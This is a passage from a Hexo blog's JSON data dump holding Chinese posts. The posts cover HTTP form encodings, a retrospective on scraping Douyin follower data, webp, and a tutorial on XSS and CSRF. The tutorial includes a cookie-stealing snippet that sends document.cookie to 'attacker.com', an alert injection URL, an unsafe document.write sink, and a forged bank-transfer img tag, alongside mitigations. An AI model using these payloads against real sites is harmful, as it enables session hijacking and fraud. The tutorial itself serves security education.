&lt;value&gt;&lt;i4&gt;41&lt;/i</span>4&gt;&lt;/value&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/params&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;/m</span>ethodcall&gt;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"什么是-http-表单\"><a href=\"#什么是-http-表单\" class=\"headerlink\" title=\"什么是 http 表单\"></a>什么是 http 表单</h2><blockquote>\n<p>web 最常见的就是 post 和 get 方法。其中 get 一般将参数编码在 url 中来传递数据，post 或者 put 必须要将数据放在 http 请求实体中，这样的数据就是 http 表单</p>\n</blockquote>\n<ul>\n<li>表单数据的编码方式是 http 头部设置 Content-Type</li>\n<li>Content-Type 可以是任意 MIME 类型</li>\n<li>下面五种最为常见<ul>\n<li>URLencoded：application/x-www-form-urlencoded</li>\n<li>mutipart:mutipart/form-data</li>\n<li>json:application/json</li>\n<li>xml:text/xml</li>\n<li>纯文本：text/plain</li>\n</ul>\n</li>\n<li>html 的 form 表单支持 urlencoded，mutipart 和 plain text 的编码，通过 enctype 属性来设定。</li>\n<li>ajax 默认是 json 格式的编码</li>\n</ul>\n<h3 id=\"URLencoded\"><a href=\"#URLencoded\" class=\"headerlink\" title=\"URLencoded\"></a>URLencoded</h3><blockquote>\n<p>form 表单的 enctype 默认就是 urlencoded</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form  method=<span class=\"string\">'post'</span> enctype=<span class=\"string\">'application/x-www-form-urlencoded'</span>&gt;</span><br><span class=\"line\">  &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">'title'</span>&gt;</span><br><span class=\"line\">  &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">'subtitle'</span>&gt;</span><br><span class=\"line\">  &lt;input type=<span class=\"string\">\"submit\"</span>&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/form&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/http请求头</span></span><br><span class=\"line\"><span class=\"regexp\">Content-Type: application/</span>x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"comment\">//请求体</span></span><br><span class=\"line\">title=test&amp;subtitle=%E4%B8%AD%E5%<span class=\"number\">9</span>B%<span class=\"function\"><span class=\"params\">BD</span>=&gt;</span>base64编码（url通用的编码，可以在chrome控制台用<span class=\"built_in\">decodeURI</span>解码）</span><br></pre></td></tr></table></figure>\n<h3 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.post(<span class=\"string\">'/xxx'</span>, &#123;</span><br><span class=\"line\">    title: <span class=\"string\">'test'</span>,</span><br><span class=\"line\">    content: [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">Content-Type: application/json;charset=utf<span class=\"number\">-8</span></span><br><span class=\"line\"><span class=\"comment\">//请求实体</span></span><br><span class=\"line\">&#123;<span class=\"string\">\"title\"</span>:<span class=\"string\">\"test\"</span>,<span class=\"string\">\"content\"</span>:[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"XML\"><a href=\"#XML\" class=\"headerlink\" title=\"XML\"></a>XML</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: text/xml</span><br><span class=\"line\"><span class=\"comment\">//请求实体</span></span><br><span class=\"line\">&lt;!--?xml version=<span class=\"string\">\"1.0\"</span>?--&gt;</span><br><span class=\"line\">&lt;methodcall&gt;</span><br><span class=\"line\">    &lt;methodname&gt;examples.getStateName&lt;<span class=\"regexp\">/methodname&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;params&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;param&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;value&gt;&lt;i4&gt;41&lt;/i</span>4&gt;&lt;/value&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/params&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;/m</span>ethodcall&gt;</span><br></pre></td></tr></table></figure>\n"},{"title":"关于抖音爬虫的复盘","date":"2018-08-06T05:52:39.000Z","_content":"\n## 背景\n\n- 因为腾讯微视这边想知道做抖音的分析是大概一个怎么样的情况，我们可以做个 demo（抓的量极少，9000 个用户包括他们的粉丝和关注），通过数学建模尝试给他们方案（他们也不知道自己想要什么）\n\n## 过程\n\n#### 主要方法\n\n- 一开始爬虫组给了两个接口，通过 uid 分别拿到粉丝和关注的（上限最多 5000 个），但是这里拿不到用户的粉丝数和关注数（重要信息），只能根据粉丝数组来算，但是最多 5000 个不准确，后来换了新的能抓精确数的接口\n- 我通过一个 uid 递归抓取粉丝接口，直到拿满 9000 个用户\n\n#### 如何写\n\n- 通过 python 的 requests 库，加上 ua 请求头（模拟手机登网页），请求接口，抓回来的数据写入 csv\n- 但是抓回来的数据发现了一个问题，就是会错行，如果抖音用户心情那里有换行，会导致 csv 换行，就会错（这个解决办法暂时是不抓心情）\n- 抓回来的数据其实极大，统共粉丝+关注有 1 千多万，并没有想的那么小\n- 一直以为 csv 是只能用逗号，没想到还能用\\t 分割，csv 读出来可以选择分割的模式\n- 爬虫不能连续爬，写个循环你以为就完事了吗，马上就被封 ip（表现为拿回来的全是空数组），所以我每次请求 sleep 一秒钟\n- 单线程跑其实挺慢的，如果可以多线程，有 ip 池就好了\n\n## 结论\n\n- 做个模型分析的话其实挺好玩的\n- 用 9599 个用户拓展出了 15122878 个用户（1 千 5 百万的用户），其中 1303439 个不重复 id（130 多万）\n- KOL 在 9599 个用户中的占比为 0.115%，即为 9599 个用户中有 11 个 KOL（粉丝大于 1 万即 kol 用户）\n- 把 9599 个用户分成 3 组，用户 A 组 3200 个，用户 B 组 3200 个，用户 C 组 3199 个\n  - 用户 A 组：平均粉丝数 89.71，平均关注数 1139.41\n  - 用户 B 组：平均粉丝数 109.59，平均关注数 1481.78\n  - 用户 C 组：平均粉丝数 69.75，平均关注数 1324.39\n- 然后丢给分析师吧\n","source":"_posts/think-douyin.md","raw":"---\ntitle: 关于抖音爬虫的复盘\ndate: 2018-08-06 13:52:39\ntags: 工作复盘\n---\n\n## 背景\n\n- 因为腾讯微视这边想知道做抖音的分析是大概一个怎么样的情况，我们可以做个 demo（抓的量极少，9000 个用户包括他们的粉丝和关注），通过数学建模尝试给他们方案（他们也不知道自己想要什么）\n\n## 过程\n\n#### 主要方法\n\n- 一开始爬虫组给了两个接口，通过 uid 分别拿到粉丝和关注的（上限最多 5000 个），但是这里拿不到用户的粉丝数和关注数（重要信息），只能根据粉丝数组来算，但是最多 5000 个不准确，后来换了新的能抓精确数的接口\n- 我通过一个 uid 递归抓取粉丝接口，直到拿满 9000 个用户\n\n#### 如何写\n\n- 通过 python 的 requests 库，加上 ua 请求头（模拟手机登网页），请求接口，抓回来的数据写入 csv\n- 但是抓回来的数据发现了一个问题，就是会错行，如果抖音用户心情那里有换行，会导致 csv 换行，就会错（这个解决办法暂时是不抓心情）\n- 抓回来的数据其实极大，统共粉丝+关注有 1 千多万，并没有想的那么小\n- 一直以为 csv 是只能用逗号，没想到还能用\\t 分割，csv 读出来可以选择分割的模式\n- 爬虫不能连续爬，写个循环你以为就完事了吗，马上就被封 ip（表现为拿回来的全是空数组），所以我每次请求 sleep 一秒钟\n- 单线程跑其实挺慢的，如果可以多线程，有 ip 池就好了\n\n## 结论\n\n- 做个模型分析的话其实挺好玩的\n- 用 9599 个用户拓展出了 15122878 个用户（1 千 5 百万的用户），其中 1303439 个不重复 id（130 多万）\n- KOL 在 9599 个用户中的占比为 0.115%，即为 9599 个用户中有 11 个 KOL（粉丝大于 1 万即 kol 用户）\n- 把 9599 个用户分成 3 组，用户 A 组 3200 个，用户 B 组 3200 个，用户 C 组 3199 个\n  - 用户 A 组：平均粉丝数 89.71，平均关注数 1139.41\n  - 用户 B 组：平均粉丝数 109.59，平均关注数 1481.78\n  - 用户 C 组：平均粉丝数 69.75，平均关注数 1324.39\n- 然后丢给分析师吧\n","slug":"think-douyin","published":1,"updated":"2018-08-06T06:49:19.763Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034sl004k0iof8i1tu8an","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><ul>\n<li>因为腾讯微视这边想知道做抖音的分析是大概一个怎么样的情况，我们可以做个 demo（抓的量极少，9000 个用户包括他们的粉丝和关注），通过数学建模尝试给他们方案（他们也不知道自己想要什么）</li>\n</ul>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><h4 id=\"主要方法\"><a href=\"#主要方法\" class=\"headerlink\" title=\"主要方法\"></a>主要方法</h4><ul>\n<li>一开始爬虫组给了两个接口，通过 uid 分别拿到粉丝和关注的（上限最多 5000 个），但是这里拿不到用户的粉丝数和关注数（重要信息），只能根据粉丝数组来算，但是最多 5000 个不准确，后来换了新的能抓精确数的接口</li>\n<li>我通过一个 uid 递归抓取粉丝接口，直到拿满 9000 个用户</li>\n</ul>\n<h4 id=\"如何写\"><a href=\"#如何写\" class=\"headerlink\" title=\"如何写\"></a>如何写</h4><ul>\n<li>通过 python 的 requests 库，加上 ua 请求头（模拟手机登网页），请求接口，抓回来的数据写入 csv</li>\n<li>但是抓回来的数据发现了一个问题，就是会错行，如果抖音用户心情那里有换行，会导致 csv 换行，就会错（这个解决办法暂时是不抓心情）</li>\n<li>抓回来的数据其实极大，统共粉丝+关注有 1 千多万，并没有想的那么小</li>\n<li>一直以为 csv 是只能用逗号，没想到还能用\\t 分割，csv 读出来可以选择分割的模式</li>\n<li>爬虫不能连续爬，写个循环你以为就完事了吗，马上就被封 ip（表现为拿回来的全是空数组），所以我每次请求 sleep 一秒钟</li>\n<li>单线程跑其实挺慢的，如果可以多线程，有 ip 池就好了</li>\n</ul>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><ul>\n<li>做个模型分析的话其实挺好玩的</li>\n<li>用 9599 个用户拓展出了 15122878 个用户（1 千 5 百万的用户），其中 1303439 个不重复 id（130 多万）</li>\n<li>KOL 在 9599 个用户中的占比为 0.115%，即为 9599 个用户中有 11 个 KOL（粉丝大于 1 万即 kol 用户）</li>\n<li>把 9599 个用户分成 3 组，用户 A 组 3200 个，用户 B 组 3200 个，用户 C 组 3199 个<ul>\n<li>用户 A 组：平均粉丝数 89.71，平均关注数 1139.41</li>\n<li>用户 B 组：平均粉丝数 109.59，平均关注数 1481.78</li>\n<li>用户 C 组：平均粉丝数 69.75，平均关注数 1324.39</li>\n</ul>\n</li>\n<li>然后丢给分析师吧</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><ul>\n<li>因为腾讯微视这边想知道做抖音的分析是大概一个怎么样的情况，我们可以做个 demo（抓的量极少，9000 个用户包括他们的粉丝和关注），通过数学建模尝试给他们方案（他们也不知道自己想要什么）</li>\n</ul>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><h4 id=\"主要方法\"><a href=\"#主要方法\" class=\"headerlink\" title=\"主要方法\"></a>主要方法</h4><ul>\n<li>一开始爬虫组给了两个接口，通过 uid 分别拿到粉丝和关注的（上限最多 5000 个），但是这里拿不到用户的粉丝数和关注数（重要信息），只能根据粉丝数组来算，但是最多 5000 个不准确，后来换了新的能抓精确数的接口</li>\n<li>我通过一个 uid 递归抓取粉丝接口，直到拿满 9000 个用户</li>\n</ul>\n<h4 id=\"如何写\"><a href=\"#如何写\" class=\"headerlink\" title=\"如何写\"></a>如何写</h4><ul>\n<li>通过 python 的 requests 库，加上 ua 请求头（模拟手机登网页），请求接口，抓回来的数据写入 csv</li>\n<li>但是抓回来的数据发现了一个问题，就是会错行，如果抖音用户心情那里有换行，会导致 csv 换行，就会错（这个解决办法暂时是不抓心情）</li>\n<li>抓回来的数据其实极大，统共粉丝+关注有 1 千多万，并没有想的那么小</li>\n<li>一直以为 csv 是只能用逗号，没想到还能用\\t 分割，csv 读出来可以选择分割的模式</li>\n<li>爬虫不能连续爬，写个循环你以为就完事了吗，马上就被封 ip（表现为拿回来的全是空数组），所以我每次请求 sleep 一秒钟</li>\n<li>单线程跑其实挺慢的，如果可以多线程，有 ip 池就好了</li>\n</ul>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><ul>\n<li>做个模型分析的话其实挺好玩的</li>\n<li>用 9599 个用户拓展出了 15122878 个用户（1 千 5 百万的用户），其中 1303439 个不重复 id（130 多万）</li>\n<li>KOL 在 9599 个用户中的占比为 0.115%，即为 9599 个用户中有 11 个 KOL（粉丝大于 1 万即 kol 用户）</li>\n<li>把 9599 个用户分成 3 组，用户 A 组 3200 个，用户 B 组 3200 个，用户 C 组 3199 个<ul>\n<li>用户 A 组：平均粉丝数 89.71，平均关注数 1139.41</li>\n<li>用户 B 组：平均粉丝数 109.59，平均关注数 1481.78</li>\n<li>用户 C 组：平均粉丝数 69.75，平均关注数 1324.39</li>\n</ul>\n</li>\n<li>然后丢给分析师吧</li>\n</ul>\n"},{"title":"使用webp压缩图片（一）","date":"2018-05-17T13:23:22.000Z","_content":"\n# 什么是 webp\n\n* 提供了有损压缩和无损压缩的图片格式\n* 谷歌推出的一种图片格式\n\n# webp 的目标\n\n* 减少文件大小，但达到和 jpeg 格式相同的图片品质，希望减少图片在网络上的发送时间。\n\n# webp 的 MIME 类型\n\n* image/webp\n\n# 推荐阅读\n\n* [webp 适配](https://github.com/ShowJoy-com/showjoy-blog/issues/10)\n","source":"_posts/study-webp-01.md","raw":"---\ntitle: 使用webp压缩图片（一）\ndate: 2018-05-17 21:23:22\ntags: 浏览器\n---\n\n# 什么是 webp\n\n* 提供了有损压缩和无损压缩的图片格式\n* 谷歌推出的一种图片格式\n\n# webp 的目标\n\n* 减少文件大小，但达到和 jpeg 格式相同的图片品质，希望减少图片在网络上的发送时间。\n\n# webp 的 MIME 类型\n\n* image/webp\n\n# 推荐阅读\n\n* [webp 适配](https://github.com/ShowJoy-com/showjoy-blog/issues/10)\n","slug":"study-webp-01","published":1,"updated":"2018-05-21T06:43:27.859Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034sq004m0iofm9d1b1s4","content":"<h1 id=\"什么是-webp\"><a href=\"#什么是-webp\" class=\"headerlink\" title=\"什么是 webp\"></a>什么是 webp</h1><ul>\n<li>提供了有损压缩和无损压缩的图片格式</li>\n<li>谷歌推出的一种图片格式</li>\n</ul>\n<h1 id=\"webp-的目标\"><a href=\"#webp-的目标\" class=\"headerlink\" title=\"webp 的目标\"></a>webp 的目标</h1><ul>\n<li>减少文件大小，但达到和 jpeg 格式相同的图片品质，希望减少图片在网络上的发送时间。</li>\n</ul>\n<h1 id=\"webp-的-MIME-类型\"><a href=\"#webp-的-MIME-类型\" class=\"headerlink\" title=\"webp 的 MIME 类型\"></a>webp 的 MIME 类型</h1><ul>\n<li>image/webp</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://github.com/ShowJoy-com/showjoy-blog/issues/10\" target=\"_blank\" rel=\"noopener\">webp 适配</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"什么是-webp\"><a href=\"#什么是-webp\" class=\"headerlink\" title=\"什么是 webp\"></a>什么是 webp</h1><ul>\n<li>提供了有损压缩和无损压缩的图片格式</li>\n<li>谷歌推出的一种图片格式</li>\n</ul>\n<h1 id=\"webp-的目标\"><a href=\"#webp-的目标\" class=\"headerlink\" title=\"webp 的目标\"></a>webp 的目标</h1><ul>\n<li>减少文件大小，但达到和 jpeg 格式相同的图片品质，希望减少图片在网络上的发送时间。</li>\n</ul>\n<h1 id=\"webp-的-MIME-类型\"><a href=\"#webp-的-MIME-类型\" class=\"headerlink\" title=\"webp 的 MIME 类型\"></a>webp 的 MIME 类型</h1><ul>\n<li>image/webp</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://github.com/ShowJoy-com/showjoy-blog/issues/10\" target=\"_blank\" rel=\"noopener\">webp 适配</a></li>\n</ul>\n"},{"title":"xss和csrf","date":"2018-07-09T03:02:34.000Z","_content":"\n# xss\n\n> cross site scripting 的缩写，即跨站脚本攻击（为了不与 css 混淆）\n\n- 主要分为三类，反射型、保存型和基于 dom 的 xss 攻击。这些漏洞的基本原理都一样，但是确定和利用漏洞方面又存在很大差异。\n\n## 反射型\n\n- 如果一个 web 程序可以动态的显示用户的错误信息，就有可能产生反射型漏洞\n- 显著特征是应用程序没有进行任何过滤和净化措施\n\n### 案例\n\n- 如果一个网站的错误消息是这样显示的，www.xxx.com/error.php?message=sorry,an error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板<p>sorry,an error occurred</p>，返回给用户\n- www.xxx.com/error.php?message=<script>alert 的写法(1)</script>，当用户打开错误页面的时候，就会出现<p><script>alert 的写法(1)</script></p>，弹出一个消息框\n\n- 当然攻击者不会很傻的只 alert 一些消息，通常 xss 都会伴随会话劫持，截获通过验证的会话令牌。\n- 截获用户的会话后，就可以访问该用户授权访问的所有数据和功能\n- 比如攻击构造这样一个 url，message 信息如下\n\n```javascript\nlet i = new Image();\ni.src = \"http://attacker.com?cookie=\" + document.cookie;\n```\n\n- 由于浏览器的同源策略，直接向 attacker.com 发送 cookie 是无法获得 www.xxx.com 的 cookie，但是 img，iframe，scipr 标签可以跨域，这就是该漏洞被成为跨站脚本的原因。\n\n## 保存型\n\n- 脚本通常保存在后端数据库，不经过过滤就存储并且显示给用户\n- 与反射性的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者访问含有恶意代码的数据，恶意代码执行\n- 与反射型不同的是，保存型不需要一个专门设计的 url 来接受 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过也可以用保存型的漏洞来获取用户 cookie 劫持。\n- 如果社交论坛存在保存型的 xss 漏洞，黑客将自己的个人信息一栏修改成恶意的 js 代码，该代码实现两个功能，首先受害者先加自己为好友，然后修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行恶意脚本，然后可怕的“蠕虫”就开始了\n\n## 基于 dom 的 xss 漏洞\n\n- 前两种 xss 漏洞，都表现为一种特殊的模式，就是应用程序提取数据并返回给受害者。而基于 dom 的 xss 不具有这种特点，攻击者是借助于 javascript 来展开攻击的\n\n## 案例\n\n```javascript\nlet url = document.location;\nlet message = /message=(.+)$/.exec(url)[1];\ndocument.write(message);\n// js脚本中这样写，如果攻击者给受害者发送www.xxx.com/error.php?message=<script>alert(1)</script>，也可以展开xss漏洞攻击\n```\n\n- 所以写 js 的前端同学注意了，万一写出了有漏洞的代码，这锅得自己背。\n\n## 解决方案\n\n- 过滤一些关键字\n- Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；设置 http-only（不能用 js 脚本进行获取）\n\n# csrf\n\n> cross site request forgery 的缩写，即跨站脚本请求伪造\n\n- 顾名思义是伪造请求冒充用户在站内的正常操作。\n- 我们知道绝大多数网站是通过 cookie 等方式辨识用户身份（包括服务器端 session 的网站，因为 session id 大多也是保存在 cookie），再予以授权。\n- 所以要伪造用户的正常操作，最好是通过 xss 或者链接欺骗等途径，让用户再本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求（xss 是实现 csrf 的手段之一）\n\n## 案例\n\n- 一论坛网站的发帖是通过 get 请求访问，点击发帖之后 js 把发帖内容拼接成目标 url 并访问：http://example.com/bbs/create_post.php?title=标题&content=内容\n- 那么我在论坛发一贴http://example.com/bbs/create_post.php?title=我是脑残&content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。\n- 如果一家银行用以执行转账操作的 url 为 http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：<img src=\"http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman\">\n- 如果有账户名为 alice 的用户访问了恶意站点，而她之前也刚访问过银行不久，登陆信息尚未过期，那么她就会损失 1000 元\n\n## 解决方案\n\n- 如何解决这个问题，过滤用户输入，不允许发布这种含有站内操作 url 的链接，这么做可能有点用，但是阻挡不了 csrf，因为攻击者可以通过 qq 发布这个链接，这样点击到这个链接的用户一样会中招。\n\n- 所以对待 csrf，我们的视角需要和对待 xss 有所不同。csrf 不一定要有站内的输入，因为他不属于注入攻击，而是属于请求伪造。被伪造的请求可以是任何来源，而非一定是站内。\n\n- 过滤请求的处理者\n  - 检查 Referer 字段：可以检查是否来源于该域名（但是请求者是可以更改 http 请求头的，他可以给这个任何值）\n  - 添加校验 token：也就是请求令牌，由于 csrf 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求再访问敏感数据请求的时候，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法执行 csrf 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求的时候，这个伪乱数也一并提交上去校验。\n- 改良站内 api 的设计，对于发布帖子这类创建资源的操作，应该只接受 post 请求，而 get 请求应该只浏览。最好是采用 RESTFUL 风格设计。\n\n# 推荐阅读\n\n- [总结 xss 与 csrf 两种跨站攻击](https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/)\n","source":"_posts/study-xss-csrf.md","raw":"---\ntitle: xss和csrf\ndate: 2018-07-09 11:02:34\ntags: 浏览器\n---\n\n# xss\n\n> cross site scripting 的缩写，即跨站脚本攻击（为了不与 css 混淆）\n\n- 主要分为三类，反射型、保存型和基于 dom 的 xss 攻击。这些漏洞的基本原理都一样，但是确定和利用漏洞方面又存在很大差异。\n\n## 反射型\n\n- 如果一个 web 程序可以动态的显示用户的错误信息，就有可能产生反射型漏洞\n- 显著特征是应用程序没有进行任何过滤和净化措施\n\n### 案例\n\n- 如果一个网站的错误消息是这样显示的，www.xxx.com/error.php?message=sorry,an error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板<p>sorry,an error occurred</p>，返回给用户\n- www.xxx.com/error.php?message=<script>alert 的写法(1)</script>，当用户打开错误页面的时候，就会出现<p><script>alert 的写法(1)</script></p>，弹出一个消息框\n\n- 当然攻击者不会很傻的只 alert 一些消息，通常 xss 都会伴随会话劫持，截获通过验证的会话令牌。\n- 截获用户的会话后，就可以访问该用户授权访问的所有数据和功能\n- 比如攻击构造这样一个 url，message 信息如下\n\n```javascript\nlet i = new Image();\ni.src = \"http://attacker.com?cookie=\" + document.cookie;\n```\n\n- 由于浏览器的同源策略，直接向 attacker.com 发送 cookie 是无法获得 www.xxx.com 的 cookie，但是 img，iframe，scipr 标签可以跨域，这就是该漏洞被成为跨站脚本的原因。\n\n## 保存型\n\n- 脚本通常保存在后端数据库，不经过过滤就存储并且显示给用户\n- 与反射性的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者访问含有恶意代码的数据，恶意代码执行\n- 与反射型不同的是，保存型不需要一个专门设计的 url 来接受 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过也可以用保存型的漏洞来获取用户 cookie 劫持。\n- 如果社交论坛存在保存型的 xss 漏洞，黑客将自己的个人信息一栏修改成恶意的 js 代码，该代码实现两个功能，首先受害者先加自己为好友，然后修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行恶意脚本，然后可怕的“蠕虫”就开始了\n\n## 基于 dom 的 xss 漏洞\n\n- 前两种 xss 漏洞，都表现为一种特殊的模式，就是应用程序提取数据并返回给受害者。而基于 dom 的 xss 不具有这种特点，攻击者是借助于 javascript 来展开攻击的\n\n## 案例\n\n```javascript\nlet url = document.location;\nlet message = /message=(.+)$/.exec(url)[1];\ndocument.write(message);\n// js脚本中这样写，如果攻击者给受害者发送www.xxx.com/error.php?message=<script>alert(1)</script>，也可以展开xss漏洞攻击\n```\n\n- 所以写 js 的前端同学注意了，万一写出了有漏洞的代码，这锅得自己背。\n\n## 解决方案\n\n- 过滤一些关键字\n- Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；设置 http-only（不能用 js 脚本进行获取）\n\n# csrf\n\n> cross site request forgery 的缩写，即跨站脚本请求伪造\n\n- 顾名思义是伪造请求冒充用户在站内的正常操作。\n- 我们知道绝大多数网站是通过 cookie 等方式辨识用户身份（包括服务器端 session 的网站，因为 session id 大多也是保存在 cookie），再予以授权。\n- 所以要伪造用户的正常操作，最好是通过 xss 或者链接欺骗等途径，让用户再本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求（xss 是实现 csrf 的手段之一）\n\n## 案例\n\n- 一论坛网站的发帖是通过 get 请求访问，点击发帖之后 js 把发帖内容拼接成目标 url 并访问：http://example.com/bbs/create_post.php?title=标题&content=内容\n- 那么我在论坛发一贴http://example.com/bbs/create_post.php?title=我是脑残&content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。\n- 如果一家银行用以执行转账操作的 url 为 http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：<img src=\"http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman\">\n- 如果有账户名为 alice 的用户访问了恶意站点，而她之前也刚访问过银行不久，登陆信息尚未过期，那么她就会损失 1000 元\n\n## 解决方案\n\n- 如何解决这个问题，过滤用户输入，不允许发布这种含有站内操作 url 的链接，这么做可能有点用，但是阻挡不了 csrf，因为攻击者可以通过 qq 发布这个链接，这样点击到这个链接的用户一样会中招。\n\n- 所以对待 csrf，我们的视角需要和对待 xss 有所不同。csrf 不一定要有站内的输入，因为他不属于注入攻击，而是属于请求伪造。被伪造的请求可以是任何来源，而非一定是站内。\n\n- 过滤请求的处理者\n  - 检查 Referer 字段：可以检查是否来源于该域名（但是请求者是可以更改 http 请求头的，他可以给这个任何值）\n  - 添加校验 token：也就是请求令牌，由于 csrf 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求再访问敏感数据请求的时候，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法执行 csrf 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求的时候，这个伪乱数也一并提交上去校验。\n- 改良站内 api 的设计，对于发布帖子这类创建资源的操作，应该只接受 post 请求，而 get 请求应该只浏览。最好是采用 RESTFUL 风格设计。\n\n# 推荐阅读\n\n- [总结 xss 与 csrf 两种跨站攻击](https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/)\n","slug":"study-xss-csrf","published":1,"updated":"2018-07-29T09:40:52.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034st004o0iof0f9yb6w2","content":"<h1 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h1><blockquote>\n<p>cross site scripting 的缩写，即跨站脚本攻击（为了不与 css 混淆）</p>\n</blockquote>\n<ul>\n<li>主要分为三类，反射型、保存型和基于 dom 的 xss 攻击。这些漏洞的基本原理都一样，但是确定和利用漏洞方面又存在很大差异。</li>\n</ul>\n<h2 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h2><ul>\n<li>如果一个 web 程序可以动态的显示用户的错误信息，就有可能产生反射型漏洞</li>\n<li>显著特征是应用程序没有进行任何过滤和净化措施</li>\n</ul>\n<h3 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h3><ul>\n<li>如果一个网站的错误消息是这样显示的，<a href=\"http://www.xxx.com/error.php?message=sorry,an\" target=\"_blank\" rel=\"noopener\">www.xxx.com/error.php?message=sorry,an</a> error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板<p>sorry,an error 